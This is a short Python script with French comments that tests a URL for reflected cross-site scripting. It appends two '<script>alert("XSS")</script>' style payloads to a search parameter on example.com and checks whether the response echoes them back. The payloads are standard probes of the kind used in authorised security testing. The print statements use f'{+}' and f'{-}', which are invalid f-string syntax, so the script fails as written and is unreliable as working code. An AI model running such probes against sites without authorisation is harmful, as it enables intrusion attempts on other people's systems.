import requests

def test_xss(url):
  # Créer une liste de chaînes de caractères dangereuses à injecter (=payload)
  payloads = ['<script>alert("XSS")</script>', '"><script>alert("XSS")</script>']

  for payload in payloads:
    # Envoyer une requête GET avec l'injection de script dangereuse dans l'URL
    response = requests.get(url + payload)

    # Si la réponse contient le payload, cela pourrait être une faille XSS
    if payload in response.text:
      print(f'{+} Faille XSS Possible, {payload}')
    else:
      print(f'{-} Faille XSS Non trouvé, {payload}')

# Tester le script avec un URL
test_xss('https://www.example.com/search?q=')
